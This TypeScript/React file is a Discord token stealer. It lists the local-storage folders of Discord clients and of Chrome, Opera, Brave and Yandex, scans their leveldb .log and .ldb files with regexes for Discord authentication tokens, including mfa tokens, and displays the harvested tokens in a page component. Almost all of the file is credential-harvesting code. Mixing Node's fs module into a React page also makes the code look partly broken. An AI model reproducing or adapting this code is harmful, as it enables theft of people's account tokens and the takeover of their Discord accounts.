import React from 'react';
import process from 'process';
import * as fs from 'fs';

const LOCALAPPDATA = process.env.LOCALAPPDATA;
const APPDATA = process.env.APPDATA;

interface Paths {
    [key: string]: string;
}

const PATHS: Paths = {
    "Discord": APPDATA + "\\Discord",
    "Discord Canary": APPDATA + "\\discordcanary",
    "Discord PTB": APPDATA + "\\discordptb",
    "Google Chrome": LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default",
    "Opera": APPDATA + "\\Opera Software\\Opera Stable",
    "Brave": LOCALAPPDATA + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCALAPPDATA + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

function getTokens(path: string): string[] {
    path = path + "\\Local Storage\\leveldb";
    const listJ4J: string[] = [];

    try {
        const fileNames = fs.readdirSync(path);
        for (const file_name of fileNames) {
            if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                continue;
            }
            const filePath = path + "\\" + file_name;
            console.log("Reading file:", filePath);

            const fileContent = fs.readFileSync(filePath, 'utf-8');
            const lines = fileContent.split(/\r?\n/);

            for (const line of lines) {
                if (line.trim() === '') {
                    continue;
                }

                const regexs = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/];
                for (const regex of regexs) {
                    const j4j = regex.exec(line);
                    if (j4j !== null) {
                        listJ4J.push(j4j[0]);
                    }
                }
            }
        }
    } catch (error) {
        console.error("Error reading directory:", path);
        console.error(error);
    }

    return listJ4J;
}


const Page: React.FC = () => {
    const allTokens: string[] = [];

    // Iterate over the keys of PATHS object
    for (const key in PATHS) {
        if (PATHS.hasOwnProperty(key)) {
            const path = PATHS[key];
            const tokens = getTokens(path);
            allTokens.push(...tokens);
        }
    }

    // Do something with allTokens, like rendering them in the component
    return (
        <div>
            <h1>Authentication Tokens</h1>
            <ul>
                {allTokens.map((token, index) => (
                    <li key={index}>{token}</li>
                ))}
            </ul>
        </div>
    );
}

export default Page;
